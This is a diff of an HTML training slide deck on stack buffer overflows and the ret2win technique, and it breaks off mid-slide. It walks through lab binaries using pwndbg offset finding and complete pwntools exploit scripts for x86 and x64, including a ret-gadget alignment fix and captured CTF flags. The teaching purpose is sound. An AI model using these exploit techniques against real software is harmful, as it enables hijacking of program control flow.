-    <span class="highlight-red">gets(buffer);</span>  <span class="highlight-red">// ❌ NO BOUNDS CHECKING!</span>
+    fflush(stdout);
+    <span class="highlight-red">gets(buffer);</span>  <span class="highlight-red">// ❌ NO LENGTH CHECKING!</span>
 
     printf(<span class="highlight-blue">"You entered: %s\n"</span>, buffer);
-}
-
-<span class="highlight-purple">int</span> <span class="highlight-green">main</span>() {
-    vulnerable();
-    <span class="highlight-purple">return</span> 0;
 }</pre>
           <p style="font-size: 0.88rem; color: var(--text-muted); margin-top: 10px;">
-            The programmer allocated 64 bytes for <code class="inline">buffer</code>, but <code class="inline">gets()</code> reads until a newline or EOF. An input of 80 bytes will overflow and corrupt the stack frame!
+            <code class="inline">gets()</code> reads from standard input until a newline character is encountered. It never checks the destination buffer size, allowing attackers to write an arbitrary number of bytes directly into the stack.
           </p>
         </div>
 
         <div class="card">
           <h3 class="section-header">Dangerous vs Safe Functions</h3>
-          <table style="width: 100%; border-collapse: collapse; font-size: 0.88rem;">
+          <table style="width: 100%; border-collapse: collapse; font-size: 0.85rem;">
             <thead>
               <tr style="border-bottom: 2px solid #334155; text-align: left;">
-                <th style="padding: 8px; color: var(--danger-red);">❌ Dangerous</th>
-                <th style="padding: 8px; color: var(--htb-green);">✅ Safe Alternative</th>
-                <th style="padding: 8px; color: var(--text-muted);">Why it fails</th>
+                <th style="padding: 6px; color: var(--danger-red);">❌ Dangerous</th>
+                <th style="padding: 6px; color: var(--htb-green);">✅ Safe Alternative</th>
+                <th style="padding: 6px; color: var(--text-muted);">Root Cause</th>
               </tr>
             </thead>
             <tbody>
               <tr style="border-bottom: 1px solid #1e293b;">
-                <td style="padding: 8px; font-family: monospace; color: var(--danger-red);">gets(buf)</td>
-                <td style="padding: 8px; font-family: monospace; color: var(--htb-green);">fgets(buf, sizeof(buf), stdin)</td>
-                <td style="padding: 8px; color: var(--text-muted);">Reads infinitely until newline</td>
+                <td style="padding: 6px; font-family: monospace; color: var(--danger-red);">gets(buf)</td>
+                <td style="padding: 6px; font-family: monospace; color: var(--htb-green);">fgets(buf, sizeof(buf), stdin)</td>
+                <td style="padding: 6px; color: var(--text-muted);">Reads infinitely until newline</td>
               </tr>
               <tr style="border-bottom: 1px solid #1e293b;">
-                <td style="padding: 8px; font-family: monospace; color: var(--danger-red);">strcpy(dst, src)</td>
-                <td style="padding: 8px; font-family: monospace; color: var(--htb-green);">strncpy(dst, src, n)</td>
-                <td style="padding: 8px; color: var(--text-muted);">Copies until null-byte without limits</td>
+                <td style="padding: 6px; font-family: monospace; color: var(--danger-red);">strcpy(dst, src)</td>
+                <td style="padding: 6px; font-family: monospace; color: var(--htb-green);">strncpy(dst, src, n)</td>
+                <td style="padding: 6px; color: var(--text-muted);">Copies until null-byte without bounds</td>
               </tr>
               <tr style="border-bottom: 1px solid #1e293b;">
-                <td style="padding: 8px; font-family: monospace; color: var(--danger-red);">sprintf(buf, ...)</td>
-                <td style="padding: 8px; font-family: monospace; color: var(--htb-green);">snprintf(buf, n, ...)</td>
-                <td style="padding: 8px; color: var(--text-muted);">Formatted string length unrestricted</td>
+                <td style="padding: 6px; font-family: monospace; color: var(--danger-red);">sprintf(buf, ...)</td>
+                <td style="padding: 6px; font-family: monospace; color: var(--htb-green);">snprintf(buf, n, ...)</td>
+                <td style="padding: 6px; color: var(--text-muted);">Unbounded format string output</td>
               </tr>
               <tr>
-                <td style="padding: 8px; font-family: monospace; color: var(--danger-red);">scanf("%s", buf)</td>
-                <td style="padding: 8px; font-family: monospace; color: var(--htb-green);">scanf("%63s", buf)</td>
-                <td style="padding: 8px; color: var(--text-muted);">No maximum length specifier</td>
+                <td style="padding: 6px; font-family: monospace; color: var(--danger-red);">scanf("%s", buf)</td>
+                <td style="padding: 6px; font-family: monospace; color: var(--htb-green);">scanf("%63s", buf)</td>
+                <td style="padding: 6px; color: var(--text-muted);">Missing maximum field width</td>
               </tr>
             </tbody>
           </table>
@@ -862,19 +849,17 @@ Machine Code / Binary ELF (.bin)
 
     <!-- Slide 6: LIVE INTERACTIVE BUFFER OVERFLOW SIMULATOR -->
     <section class="slide" data-title="Live Overflow Simulator">
-      <h1 class="slide-title">Interactive <span class="accent">Buffer Overflow Simulator</span></h1>
+      <h1 class="slide-title">Live <span class="accent">Buffer Overflow Simulator</span></h1>
       <h2 class="slide-subtitle">Watch memory corruption and control flow hijacking occur in real-time</h2>
 
       <div class="simulator-box">
-        <!-- Controls & Presets -->
         <div class="sim-controls">
           <div class="sim-input-group">
-            <span style="font-weight: 600; font-size: 0.9rem;">Payload:</span>
+            <span style="font-weight: 600; font-size: 0.88rem;">Payload:</span>
             <input type="text" id="simPayloadInput" class="sim-input" value="A"*32 placeholder="Type characters here...">
           </div>
-          <span style="font-family: monospace; font-size: 0.9rem; color: var(--cyber-blue);" id="simByteCount">Length: 32 bytes</span>
+          <span style="font-family: monospace; font-size: 0.88rem; color: var(--cyber-blue);" id="simByteCount">Length: 32 bytes</span>
 
-          <!-- Preset buttons -->
           <div style="display: flex; gap: 6px;">
             <button class="btn" onclick="setSimPreset('normal')">Normal (32B)</button>
             <button class="btn" onclick="setSimPreset('fit')">Exact Fit (64B)</button>
@@ -884,7 +869,6 @@ Machine Code / Binary ELF (.bin)
           </div>
         </div>
 
-        <!-- Live Stack Grid -->
         <div class="stack-visual-table">
           <div class="stack-row header">
             <span>Stack Region</span>
@@ -915,7 +899,6 @@ Machine Code / Binary ELF (.bin)
           </div>
         </div>
 
-        <!-- Status & Virtual Terminal -->
         <div id="simStatusBanner" class="sim-status-banner status-normal">
           <span id="simStatusText">🟢 Execution Normal: Program will safely return to caller (&lt;main+80&gt;).</span>
           <span id="simRipVal" style="font-family: monospace; font-size: 0.9rem;">RIP = 0x401290</span>
@@ -923,203 +906,420 @@ Machine Code / Binary ELF (.bin)
       </div>
     </section>
 
-    <!-- Slide 7: x86 (32-bit) vs x64 (64-bit) Architectures -->
-    <section class="slide" data-title="32-bit vs 64-bit Differences">
-      <h1 class="slide-title">32-bit (x86) vs 64-bit (x64) <span class="accent">Differences</span></h1>
-      <h2 class="slide-subtitle">How architecture changes your exploit payload and gadget chains</h2>
+    <!-- Slide 7: Finding Offsets with cyclic & pwndbg -->
+    <section class="slide" data-title="Offset Finding with cyclic">
+      <h1 class="slide-title">Finding Offsets: <span class="accent">cyclic &amp; pwndbg</span></h1>
+      <h2 class="slide-subtitle">Never guess offsets — determine exact distances mathematically</h2>
 
       <div class="grid-2">
         <div class="card">
-          <div class="card-header">
-            <span class="card-title">x86 (32-bit) Architecture</span>
-            <span class="brand-badge" style="background: #3b82f6; color: #fff;">4-Byte Pointers</span>
-          </div>
-          <ul style="list-style: none; display: flex; flex-direction: column; gap: 10px; font-size: 0.92rem;">
-            <li><strong>Registers:</strong> <code class="inline">EIP</code> (Instruction), <code class="inline">ESP</code> (Stack), <code class="inline">EBP</code> (Base)</li>
-            <li><strong>Pointer Size:</strong> 4 bytes (<code class="inline">p32(addr)</code>)</li>
-            <li><strong>Calling Convention:</strong> Arguments are passed entirely on the <strong>stack</strong>:
-              <pre class="code-block" style="margin-top: 6px;">
-push arg2
-push arg1
-call function</pre>
-            </li>
-            <li><strong>Stack Alignment:</strong> Less strict alignment requirements. Easy direct jumps to target functions!</li>
-          </ul>
-        </div>
-
-        <div class="card">
-          <div class="card-header">
-            <span class="card-title">x64 (64-bit) Architecture</span>
-            <span class="brand-badge" style="background: var(--htb-green); color: #000;">8-Byte Pointers</span>
-          </div>
-          <ul style="list-style: none; display: flex; flex-direction: column; gap: 10px; font-size: 0.92rem;">
-            <li><strong>Registers:</strong> <code class="inline">RIP</code>, <code class="inline">RSP</code>, <code class="inline">RBP</code> + general registers <code class="inline">R8 - R15</code></li>
-            <li><strong>Pointer Size:</strong> 8 bytes (<code class="inline">p64(addr)</code>)</li>
-            <li><strong>Calling Convention:</strong> First 6 arguments are passed in <strong>registers</strong>:
-              <pre class="code-block" style="margin-top: 6px;">
-RDI ➔ RSI ➔ RDX ➔ RCX ➔ R8 ➔ R9</pre>
-            </li>
-            <li><strong>⚠️ The 16-byte Stack Alignment Trap:</strong>
-              <div style="font-size: 0.85rem; color: var(--text-muted); margin-top: 4px;">
-                GLIBC functions (like <code class="inline">printf</code> or <code class="inline">system</code>) enforce 16-byte aligned RSP via <code class="inline">movaps</code> instructions. Jumping directly to <code class="inline">win()</code> can cause a crash! Fixed by prepending a <code class="inline">ret</code> gadget!
-              </div>
-            </li>
-          </ul>
-        </div>
-      </div>
-    </section>
-
-    <!-- Slide 8: The ret2win Technique -->
-    <section class="slide" data-title="ret2win Exploitation">
-      <h1 class="slide-title">The <span class="accent">ret2win</span> Technique</h1>
-      <h2 class="slide-subtitle">Hijacking the return address to trigger an existing target function</h2>
-
-      <div class="grid-2">
-        <div class="card">
-          <h3 class="section-header">Payload Structure</h3>
-          <p style="margin-bottom: 12px;">
-            The exploit replaces the function's legitimate return address with the address of a hidden <code class="inline">win()</code> function:
-          </p>
-          <div style="display: flex; flex-direction: column; gap: 8px; margin: 16px 0;">
-            <div style="background: #1e3a8a; padding: 12px; border-radius: 6px; text-align: center;">
-              <strong>Padding ('A' * Offset)</strong>
-              <div style="font-size: 0.8rem; color: #bfdbfe;">Fills local buffer + Saved RBP up to RIP</div>
-            </div>
-            <div style="background: #065f46; padding: 12px; border-radius: 6px; text-align: center;">
-              <strong>[Optional] ret Gadget (x64 only)</strong>
-              <div style="font-size: 0.8rem; color: #a7f3d0;">Aligns RSP to 16 bytes for GLIBC / printf</div>
-            </div>
-            <div style="background: #7c2d12; padding: 12px; border-radius: 6px; text-align: center; border: 2px solid var(--htb-green);">
-              <strong>win() Function Address</strong>
-              <div style="font-size: 0.8rem; color: #fed7aa;">Address found via Ghidra / readelf / pwntools</div>
-            </div>
-          </div>
-        </div>
-
-        <div class="card">
-          <h3 class="section-header">Execution Flow</h3>
-          <pre class="code-block">
-1. Function completes its work
-2. Executes function epilogue:
-   leave  ➔  mov rsp, rbp; pop rbp
-3. Executes ret:
-   ret    ➔  pop rip; jmp rip
-             ▲
-             │ Instead of returning to main(),
-             │ CPU pops our win() address!
-             ▼
-4. CPU jumps directly into win():
-   win() prints:
-   🎉 FLAG{x64_r3t2w1n_b4s1cs}</pre>
-        </div>
-      </div>
-    </section>
-
-    <!-- Slide 9: Finding the Offset with cyclic & pwndbg -->
-    <section class="slide" data-title="Finding the Offset">
-      <h1 class="slide-title">Finding the Offset: <span class="accent">cyclic &amp; pwndbg</span></h1>
-      <h2 class="slide-subtitle">Never guess how many bytes to send — calculate it mathematically</h2>
-
-      <div class="grid-2">
-        <div class="card">
-          <h3 class="section-header">The 3-Step Methodology</h3>
-          <ol style="padding-left: 20px; display: flex; flex-direction: column; gap: 12px; font-size: 0.95rem;">
+          <h3 class="section-header">The 3-Step cyclic Methodology</h3>
+          <ol style="padding-left: 20px; display: flex; flex-direction: column; gap: 10px; font-size: 0.9rem;">
             <li>
-              <strong>Generate De Bruijn Pattern:</strong>
+              <strong>1. Generate a unique De Bruijn sequence:</strong>
               <pre class="code-block">pwndbg&gt; cyclic 100
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaaj...</pre>
             </li>
             <li>
-              <strong>Crash the Target with Pattern:</strong>
+              <strong>2. Run the binary in GDB and input the sequence:</strong>
               <pre class="code-block">pwndbg&gt; run
-Enter your input: [paste cyclic string]
+Enter your input: [paste pattern]
 Program received signal SIGSEGV (fault on 0x6161616a)</pre>
             </li>
             <li>
-              <strong>Query the Exact Offset:</strong>
+              <strong>3. Query cyclic to calculate the exact offset:</strong>
               <pre class="code-block">pwndbg&gt; cyclic -l 0x6161616a
-Finding cyclic pattern of length 4 with ...
+Finding cyclic pattern of length 4: b'jaaa'
 Found at offset 72</pre>
             </li>
           </ol>
         </div>
 
         <div class="card">
-          <h3 class="section-header">Why De Bruijn Patterns?</h3>
-          <p style="margin-bottom: 12px;">
-            A De Bruijn cyclic sequence has a mathematical property: <strong>every 4 or 8 byte substring is completely unique</strong> throughout the entire pattern.
+          <h3 class="section-header">Offset Differences: Assembly vs Cyclic</h3>
+          <p style="font-size: 0.9rem; margin-bottom: 12px;">
+            In Danish's writeup, we see two ways to determine the offset:
           </p>
-          <div style="padding: 14px; background: rgba(159, 239, 0, 0.08); border-left: 4px solid var(--htb-green); border-radius: 4px;">
-            <p style="font-size: 0.9rem; font-weight: 600; color: var(--htb-green);">No Guessing, Instant Accuracy:</p>
-            <p style="font-size: 0.85rem; color: var(--text-main); margin-top: 4px;">
-              Looking at whatever value lands in <code class="inline">EIP/RIP</code> or the top of the stack, <code class="inline">cyclic -l</code> immediately looks up the exact distance from the buffer start.
+          <ul style="list-style: none; display: flex; flex-direction: column; gap: 10px; font-size: 0.88rem;">
+            <li style="padding: 10px; background: var(--bg-card-alt); border-radius: 6px;">
+              <strong style="color: var(--htb-green);">A. Decompilation / Assembly Inspection:</strong><br>
+              In Ghidra/GDB: Local buffer (<code class="inline">64B</code>) + compiler saved registers (e.g. EBX/RBP) = Exact distance to the return address.
+            </li>
+            <li style="padding: 10px; background: var(--bg-card-alt); border-radius: 6px;">
+              <strong style="color: var(--cyber-blue);">B. Dynamic Crash Analysis (<code class="inline">cyclic -l</code>):</strong><br>
+              Every 4-byte (32-bit) or 8-byte (64-bit) chunk in a cyclic string is unique. Whatever crashes the instruction pointer reveals the exact offset immediately!
+            </li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 8: Hands-On Lab: x86 Challenge -->
+    <section class="slide" data-title="Hands-on x86 Challenge">
+      <h1 class="slide-title">Hands-On Practice: <span class="accent">x86 (32-bit)</span></h1>
+      <h2 class="slide-subtitle">Walkthrough from writeup: `handson/x86/challenge`</h2>
+
+      <div class="grid-2">
+        <div class="card">
+          <div class="tab-container">
+            <div class="tab-nav">
+              <button class="tab-btn active" onclick="switchTab(this, 'h86-analysis')">1. Analysis</button>
+              <button class="tab-btn" onclick="switchTab(this, 'h86-pwndbg')">2. pwndbg</button>
+              <button class="tab-btn" onclick="switchTab(this, 'h86-script')">3. solve.py</button>
+            </div>
+
+            <!-- Tab 1: Analysis -->
+            <div class="tab-content active" id="h86-analysis">
+              <pre class="code-block"><span class="highlight-muted">$ file challenge</span>
+challenge: ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
+
+<span class="highlight-muted">$ checksec --file=challenge</span>
+Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    <span class="highlight-red">No canary found</span>
+NX:       <span class="highlight-green">NX enabled</span>
+PIE:      <span class="highlight-red">No PIE (0x8048000)</span></pre>
+              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 8px;">
+                <strong>Ghidra Analysis:</strong> <code class="inline">vulnerable()</code> reserves 64 bytes for <code class="inline">buffer</code>. GCC also pushed <code class="inline">ebx</code> (4 bytes) + <code class="inline">ebp</code> (4 bytes).<br>
+                Offset: <code class="inline">64 + 4 + 4 = 76 bytes</code>!
+              </p>
+            </div>
+
+            <!-- Tab 2: pwndbg -->
+            <div class="tab-content" id="h86-pwndbg">
+              <pre class="code-block"><span class="highlight-muted"># Finding function address</span>
+pwndbg&gt; info functions
+0x080491a6  win
+0x080491e2  vulnerable
+0x08049245  main
+
+<span class="highlight-muted"># Verifying offset via cyclic</span>
+pwndbg&gt; cyclic 100
+pwndbg&gt; run
+[crashes at 'taaa']
+pwndbg&gt; cyclic -l taaa
+Found at offset 76</pre>
+            </div>
+
+            <!-- Tab 3: Solve Script -->
+            <div class="tab-content" id="h86-script">
+              <pre class="code-block"><span class="highlight-blue">from</span> pwn <span class="highlight-blue">import</span> *
+
+elf = ELF(<span class="highlight-green">'./challenge'</span>)
+context.binary = elf
+
+offset = <span class="highlight-green">76</span>
+win_address = elf.symbols[<span class="highlight-green">'win'</span>]  <span class="highlight-muted"># 0x080491a6</span>
+
+payload = <span class="highlight-purple">b'A'</span> * offset
+payload += pack(win_address)     <span class="highlight-muted"># or p32(win_address)</span>
+
+p = process(<span class="highlight-green">'./challenge'</span>)
+p.sendlineafter(<span class="highlight-purple">b'input: '</span>, payload)
+p.interactive()</pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3 class="section-header">Execution &amp; Result</h3>
+          <p style="font-size: 0.9rem; margin-bottom: 12px;">
+            Running the exploit directly inside Colima:
+          </p>
+          <pre class="code-block" style="color: #6ee7b7;">
+$ python3 solve.py
+[+] Starting local process './challenge': pid 8340
+You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+
+🎉 Congratulations! You solved the x86 hands-on!
+FLAG{x86_r3t2w1n_b4s1cs}</pre>
+          <div style="margin-top: 14px; padding: 10px; background: rgba(159, 239, 0, 0.08); border-left: 4px solid var(--htb-green); border-radius: 4px;">
+            <p style="font-size: 0.85rem; color: var(--text-main);">
+              <strong>Why did it work directly?</strong> In 32-bit x86, stack alignment is not strictly enforced by standard libc functions like <code class="inline">printf</code>. Overwriting EIP directly transferred execution to <code class="inline">win()</code>!
             </p>
           </div>
         </div>
       </div>
     </section>
 
-    <!-- Slide 10: Writing the Exploit with pwntools -->
-    <section class="slide" data-title="Exploit Scripting with pwntools">
-      <h1 class="slide-title">Crafting the Exploit with <span class="accent">pwntools</span></h1>
-      <h2 class="slide-subtitle">Clean, robust Python exploit scripting for local &amp; remote targets</h2>
+    <!-- Slide 9: Hands-On Lab: x64 & Stack Alignment Trap -->
+    <section class="slide" data-title="Hands-on x64 & Stack Alignment">
+      <h1 class="slide-title">Hands-On Practice: <span class="accent">x64 &amp; The Stack Trap</span></h1>
+      <h2 class="slide-subtitle">Walkthrough from writeup: `handson/x64/challenge`</h2>
 
       <div class="grid-2">
         <div class="card">
-          <div class="card-header">
-            <span class="card-title">x64 Exploit (<code class="inline">solve.py</code>)</span>
-            <span class="brand-badge">Python 3</span>
+          <div class="tab-container">
+            <div class="tab-nav">
+              <button class="tab-btn active" onclick="switchTab(this, 'h64-crash')">1. The Crash</button>
+              <button class="tab-btn" onclick="switchTab(this, 'h64-why')">2. Why It Crashed?</button>
+              <button class="tab-btn" onclick="switchTab(this, 'h64-fix')">3. The Fix (ret gadget)</button>
+            </div>
+
+            <!-- Tab 1: The Crash -->
+            <div class="tab-content active" id="h64-crash">
+              <p style="font-size: 0.88rem; margin-bottom: 8px;">
+                Offset in x64: 64B buffer + 8B Saved RBP = <strong>72 bytes</strong>.
+              </p>
+              <pre class="code-block"><span class="highlight-muted"># Initial naive payload:</span>
+payload = <span class="highlight-purple">b'A'</span> * 72 + p64(win_address)
+
+<span class="highlight-red"># Result: Program crashes with SIGSEGV inside puts/printf!</span>
+pwndbg&gt; r
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7c80035 in _IO_puts () ... movaps [rsp+...], xmm0</pre>
+            </div>
+
+            <!-- Tab 2: Why it crashed -->
+            <div class="tab-content" id="h64-why">
+              <p style="font-size: 0.88rem; margin-bottom: 8px;">
+                <strong>The 16-byte Stack Alignment Requirement:</strong>
+              </p>
+              <ul style="font-size: 0.85rem; color: var(--text-muted); display: flex; flex-direction: column; gap: 6px;">
+                <li>The System V x86-64 ABI requires <code class="inline">RSP</code> to be a multiple of 16 (<code class="inline">RSP % 16 == 0</code>) before executing any <code class="inline">call</code> instruction.</li>
+                <li>GLIBC's <code class="inline">printf</code> and <code class="inline">puts</code> use SSE instructions like <code class="inline">movaps</code> that <strong>crash if the memory address is not 16-byte aligned</strong>!</li>
+                <li>When our exploit jumps directly to <code class="inline">win()</code>, RSP ends with 8, triggering a crash!</li>
+              </ul>
+            </div>
+
+            <!-- Tab 3: The Fix -->
+            <div class="tab-content" id="h64-fix">
+              <p style="font-size: 0.88rem; margin-bottom: 8px;">
+                <strong>The Solution: Add a dummy <code class="inline">ret</code> instruction!</strong>
+              </p>
+              <pre class="code-block"><span class="highlight-muted"># 1. Find a ret gadget</span>
+ret_gadget = ROP(elf).find_gadget([<span class="highlight-green">'ret'</span>])[0]  <span class="highlight-muted"># 0x401016</span>
+
+<span class="highlight-muted"># 2. Add to payload:</span>
+payload = <span class="highlight-purple">b'A'</span> * 72
+payload += p64(ret_gadget)   <span class="highlight-green"># Pops 8 bytes, aligning RSP to 16!</span>
+payload += p64(win_address)  <span class="highlight-green"># Now calls win() safely!</span></pre>
+            </div>
           </div>
-          <pre class="code-block"><span class="highlight-blue">from</span> pwn <span class="highlight-blue">import</span> *
-
-<span class="highlight-muted"># 1. Load target ELF</span>
-elf = ELF(<span class="highlight-green">'./challenge'</span>)
-context.binary = elf
-
-<span class="highlight-muted"># 2. Extract targets &amp; gadgets</span>
-offset = <span class="highlight-green">72</span>
-win_addr = elf.symbols[<span class="highlight-green">'win'</span>]
-ret_gadget = ROP(elf).find_gadget([<span class="highlight-green">'ret'</span>])[<span class="highlight-green">0</span>]
-
-<span class="highlight-muted"># 3. Assemble payload</span>
-payload = <span class="highlight-purple">b'A'</span> * offset
-payload += p64(ret_gadget)  <span class="highlight-muted"># 16-byte alignment</span>
-payload += p64(win_addr)
-
-<span class="highlight-muted"># 4. Dispatch</span>
-p = process(<span class="highlight-green">'./challenge'</span>)
-p.sendlineafter(<span class="highlight-purple">b'input: '</span>, payload)
-p.interactive()</pre>
         </div>
 
         <div class="card">
-          <div class="card-header">
-            <span class="card-title">x86 Exploit (<code class="inline">solve.py</code>)</span>
-            <span class="brand-badge" style="background: #3b82f6; color: #fff;">Python 3</span>
-          </div>
+          <h3 class="section-header">Complete x64 Solution (<code class="inline">solve.py</code>)</h3>
           <pre class="code-block"><span class="highlight-blue">from</span> pwn <span class="highlight-blue">import</span> *
 
-<span class="highlight-muted"># 1. Load target ELF</span>
 elf = ELF(<span class="highlight-green">'./challenge'</span>)
 context.binary = elf
 
-<span class="highlight-muted"># 2. Extract targets</span>
-offset = <span class="highlight-green">76</span>
-win_addr = elf.symbols[<span class="highlight-green">'win'</span>]
+offset = <span class="highlight-green">72</span>
+win_address = elf.symbols[<span class="highlight-green">'win'</span>]
+ret_gadget = ROP(elf).find_gadget([<span class="highlight-green">'ret'</span>])[<span class="highlight-green">0</span>]
 
-<span class="highlight-muted"># 3. Assemble payload</span>
 payload = <span class="highlight-purple">b'A'</span> * offset
-payload += p32(win_addr)    <span class="highlight-muted"># 32-bit pack (4 bytes)</span>
+payload += p64(ret_gadget)   <span class="highlight-muted"># Align stack</span>
+payload += p64(win_address)  <span class="highlight-muted"># Jump to win()</span>
 
-<span class="highlight-muted"># 4. Dispatch</span>
 p = process(<span class="highlight-green">'./challenge'</span>)
 p.sendlineafter(<span class="highlight-purple">b'input: '</span>, payload)
-p.interactive()</pre>
+p.interactive()
+<span class="highlight-green"># Output: FLAG{x64_r3t2w1n_b4s1cs}</span></pre>
         </div>
       </div>
     </section>
 
-    <!-- Slide 11: Security Mitigations (checksec) -->
+    <!-- Slide 10: Comparison Master Matrix -->
+    <section class="slide" data-title="Summary: x86 vs x64">
+      <h1 class="slide-title">Architecture Summary: <span class="accent">x86 vs x64</span></h1>
+      <h2 class="slide-subtitle">Key technical differences summarized directly from the writeup</h2>
+
+      <div class="card" style="padding: 24px;">
+        <table style="width: 100%; border-collapse: collapse; font-size: 0.92rem;">
+          <thead>
+            <tr style="background: #101c2e; border-bottom: 2px solid var(--border-subtle); text-align: left;">
+              <th style="padding: 12px; color: #ffffff;">Feature / Attribute</th>
+              <th style="padding: 12px; color: #60a5fa;">x86 (32-bit)</th>
+              <th style="padding: 12px; color: var(--htb-green);">x64 (64-bit)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr style="border-bottom: 1px solid #1e293b;">
+              <td style="padding: 12px; font-weight: 600;">Hands-on Offset</td>
+              <td style="padding: 12px; font-family: monospace;">76 bytes (64B + 4B EBX + 4B EBP)</td>
+              <td style="padding: 12px; font-family: monospace;">72 bytes (64B + 8B RBP)</td>
+            </tr>
+            <tr style="border-bottom: 1px solid #1e293b;">
+              <td style="padding: 12px; font-weight: 600;">Register to Inspect in GDB</td>
+              <td style="padding: 12px;"><code class="inline">EIP</code> (shows corrupted address directly)</td>
+              <td style="padding: 12px;"><code class="inline">RSP</code> (top of stack holds corrupted ret addr)</td>
+            </tr>
+            <tr style="border-bottom: 1px solid #1e293b;">
+              <td style="padding: 12px; font-weight: 600;">Pointer / Address Size</td>
+              <td style="padding: 12px;">4 bytes (<code class="inline">p32()</code> or <code class="inline">pack()</code>)</td>
+              <td style="padding: 12px;">8 bytes (<code class="inline">p64()</code> or <code class="inline">pack()</code>)</td>
+            </tr>
+            <tr style="border-bottom: 1px solid #1e293b;">
+              <td style="padding: 12px; font-weight: 600;">Function Arguments</td>
+              <td style="padding: 12px;">Pushed onto the stack in reverse order</td>
+              <td style="padding: 12px;">Passed in registers: <code class="inline">RDI, RSI, RDX, RCX, R8, R9</code></td>
+            </tr>
+            <tr style="border-bottom: 1px solid #1e293b;">
+              <td style="padding: 12px; font-weight: 600;">16-byte Stack Alignment</td>
+              <td style="padding: 12px; color: var(--htb-green);">Not strictly required</td>
+              <td style="padding: 12px; color: var(--danger-red);">Strictly enforced by GLIBC (<code class="inline">movaps</code>)</td>
+            </tr>
+            <tr>
+              <td style="padding: 12px; font-weight: 600;">Extra Gadget Needed</td>
+              <td style="padding: 12px; color: var(--htb-green);">No gadget required</td>
+              <td style="padding: 12px; color: var(--warning-orange);">Yes (<code class="inline">ret</code> gadget required for alignment)</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Slide 11: Mini-CTF: x86 Challenge -->
+    <section class="slide" data-title="Mini-CTF x86 Binary">
+      <h1 class="slide-title">Mini-CTF: <span class="accent">x86 Binary</span></h1>
+      <h2 class="slide-subtitle">Walkthrough from writeup: `mini-ctf/x86` (`challenge_x86`)</h2>
+
+      <div class="grid-2">
+        <div class="card">
+          <h3 class="section-header">1. Recon &amp; Reverse Engineering</h3>
+          <p style="font-size: 0.88rem; margin-bottom: 8px;">
+            The program presents a menu interface:
+          </p>
+          <pre class="code-block">
+╔═══════════════════════════════════════════╗
+║     Welcome to SecureLogin v1.0 (x86)     ║
+║        Totally unhackable system!         ║
+╚═══════════════════════════════════════════╝
+1. Enter the system
+2. Exit
+&gt; 1
+Enter hacker name? [input here]</pre>
+          <ul style="font-size: 0.85rem; color: var(--text-muted); display: flex; flex-direction: column; gap: 6px; margin-top: 10px;">
+            <li>Entering garbage on menu does not crash. Selecting <strong>1</strong> leads to <code class="inline">gets()</code>!</li>
+            <li>In Ghidra: Target function is <code class="inline">get_flag()</code> at <code class="inline">0x08049216</code>.</li>
+            <li>Offset: In assembly, <code class="inline">sub esp, 0x24</code> (36B buffer) + 4B EBX + 4B EBP = <strong>44 bytes</strong>!</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <h3 class="section-header">2. Exploit Script &amp; Remote Flag</h3>
+          <pre class="code-block"><span class="highlight-blue">from</span> pwn <span class="highlight-blue">import</span> *
+
+elf = ELF(<span class="highlight-green">'./challenge_x86'</span>)
+context.binary = elf
+
+offset = <span class="highlight-green">44</span>
+flag_address = elf.symbols[<span class="highlight-green">'get_flag'</span>]  <span class="highlight-muted"># 0x08049216</span>
+
+payload = <span class="highlight-purple">b'A'</span> * offset
+payload += pack(flag_address)
+
+<span class="highlight-muted"># Connect locally or to Docker daemon</span>
+<span class="highlight-blue">if</span> args.REMOTE:
+    p = remote(<span class="highlight-green">'127.0.0.1'</span>, <span class="highlight-green">9001</span>)
+<span class="highlight-blue">else</span>:
+    p = process(<span class="highlight-green">'./challenge_x86'</span>)
+
+<span class="highlight-muted"># Menu interaction:</span>
+p.sendlineafter(<span class="highlight-purple">b'&gt;'</span>, <span class="highlight-purple">b'1'</span>)
+p.sendlineafter(<span class="highlight-purple">b'name? '</span>, payload)
+p.interactive()</pre>
+          <div style="margin-top: 12px; padding: 10px; background: rgba(159, 239, 0, 0.1); border: 1px solid var(--htb-green); border-radius: 6px;">
+            <span style="font-weight: bold; color: var(--htb-green);">🚩 Captured Flag:</span>
+            <span style="font-family: monospace; font-size: 0.88rem; color: #ffffff;">HTB{x86_buff3r_0v3rfl0w_m4st3r}</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 12: Mini-CTF: x64 Challenge -->
+    <section class="slide" data-title="Mini-CTF x64 Binary">
+      <h1 class="slide-title">Mini-CTF: <span class="accent">x64 Binary</span></h1>
+      <h2 class="slide-subtitle">Walkthrough from writeup: `mini-ctf/x64` (`challenge_x64`)</h2>
+
+      <div class="grid-2">
+        <div class="card">
+          <div class="tab-container">
+            <div class="tab-nav">
+              <button class="tab-btn active" onclick="switchTab(this, 'm64-recon')">1. Recon &amp; Offset</button>
+              <button class="tab-btn" onclick="switchTab(this, 'm64-gadget')">2. ret Gadget</button>
+              <button class="tab-btn" onclick="switchTab(this, 'm64-solve')">3. solve.py</button>
+            </div>
+
+            <!-- Tab 1: Recon & Offset -->
+            <div class="tab-content active" id="m64-recon">
+              <ul style="font-size: 0.85rem; color: var(--text-muted); display: flex; flex-direction: column; gap: 6px;">
+                <li>Main menu reads choice using <code class="inline">scanf("%d")</code> (safe format string at <code class="inline">0x402210</code>).</li>
+                <li>Choosing 1 invokes vulnerable function using <code class="inline">gets()</code>.</li>
+                <li><strong>Target:</strong> <code class="inline">get_flag()</code> at <code class="inline">0x401276</code>.</li>
+                <li><strong>Offset calculation:</strong>
+                  <pre class="code-block">pwndbg&gt; cyclic 100
+[crash at 'faaaaaaa']
+pwndbg&gt; cyclic -l faaaaaaa
+Found at offset 40</pre>
+                </li>
+              </ul>
+            </div>
+
+            <!-- Tab 2: ret Gadget -->
+            <div class="tab-content" id="m64-gadget">
